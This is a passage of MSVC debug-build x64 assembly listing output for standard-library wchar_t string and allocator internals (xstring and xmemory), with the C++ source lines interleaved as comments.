?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty, COMDAT

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b bd e0 00
	00 00		 mov	 rdi, QWORD PTR this$[rbp]
  0002d	33 c0		 xor	 eax, eax
  0002f	b9 10 00 00 00	 mov	 ecx, 16
  00034	f3 aa		 rep stosb
  00036	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00044	5f		 pop	 rdi
  00045	5d		 pop	 rbp
  00046	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer, COMDAT

; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
tv66 = 192
this$ = 240
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged, COMDAT

; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2244 :         return _Myres > _Small_string_capacity;

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 18 07	 cmp	 QWORD PTR [rax+24], 7
  0002b	76 0c		 jbe	 SHORT $LN3@Large_mode
  0002d	c7 85 c0 00 00
	00 01 00 00 00	 mov	 DWORD PTR tv66[rbp], 1
  00037	eb 0a		 jmp	 SHORT $LN4@Large_mode
$LN3@Large_mode:
  00039	c7 85 c0 00 00
	00 00 00 00 00	 mov	 DWORD PTR tv66[rbp], 0
$LN4@Large_mode:
  00043	0f b6 85 c0 00
	00 00		 movzx	 eax, BYTE PTR tv66[rbp]

; 2245 :     }

  0004a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2235 :         const value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2236 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2241 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2226 :         value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2227 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2232 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty

; 2213 : 
; 2214 :     // length of internal buffer, [1, 16] (NB: used by the debugger visualizer)
; 2215 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2216 :     // roundup mask for allocated buffers, [0, 15]
; 2217 :     static constexpr size_type _Alloc_mask = sizeof(value_type) <= 1 ? 15
; 2218 :                                            : sizeof(value_type) <= 2 ? 7
; 2219 :                                            : sizeof(value_type) <= 4 ? 3
; 2220 :                                            : sizeof(value_type) <= 8 ? 1
; 2221 :                                                                      : 0;
; 2222 :     // capacity in small mode
; 2223 :     static constexpr size_type _Small_string_capacity = _BUF_SIZE - 1;
; 2224 : 
; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {
; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;
; 2232 :     }
; 2233 : 
; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {
; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;
; 2241 :     }
; 2242 : 
; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {
; 2244 :         return _Myres > _Small_string_capacity;
; 2245 :     }
; 2246 : 
; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {
; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }
; 2257 : 
; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {
; 2261 :             _Xran();
; 2262 :         }
; 2263 :     }
; 2264 : 
; 2265 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2266 :         // checks whether _Off is in the bounds of [0, size())
; 2267 :         if (_Mysize <= _Off) {
; 2268 :             _Xran();
; 2269 :         }
; 2270 :     }
; 2271 : 
; 2272 :     [[noreturn]] static void _Xran() {
; 2273 :         _Xout_of_range("invalid string position");
; 2274 :     }
; 2275 : 
; 2276 :     _NODISCARD _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2277 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2278 :         return (_STD min)(_Size, _Mysize - _Off);
; 2279 :     }
; 2280 : 
; 2281 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2282 :         // This constructor previously initialized _Ptr. Don't rely on the new behavior without
; 2283 :         // renaming `_String_val` (and fixing the visualizer).
; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers
; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0002e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00035	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 c7 40 18 00
	00 00 00	 mov	 QWORD PTR [rax+24], 0

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 224
_Al$ = 232
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction, COMDAT

; 744  :     _NODISCARD static _CONSTEXPR20 _Alloc select_on_container_copy_construction(const _Alloc& _Al) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 745  :         return _Al;

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 746  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$ = 224
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 740  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  0001f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 742  :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Count$ = 232
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

  00024	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$_Get_size_of_n@$01@std@@YA_K_K@Z ; std::_Get_size_of_n<2>
  00030	48 8b c8	 mov	 rcx, rax
  00033	e8 00 00 00 00	 call	 ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 983  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
_Count$ = 240
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT

; 974  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 975  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 976  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	48 8b d0	 mov	 rdx, rax
  00036	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  0003d	e8 00 00 00 00	 call	 ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ; std::_Deallocate<16,0>

; 978  :     }

  00042	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00049	5f		 pop	 rdi
  0004a	5d		 pop	 rbp
  0004b	c3		 ret	 0
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 966  :     constexpr allocator() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2326 : [[noreturn]] inline void _Xlen_string() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2327 :     _Xlength_error("string too long");

  0001b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_C@_0BA@JFNIOLAK@string?5too?5long@
  00022	e8 00 00 00 00	 call	 ?_Xlength_error@std@@YAXPEBD@Z ; std::_Xlength_error
$LN2@Xlen_strin:

; 2328 : }

  00027	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
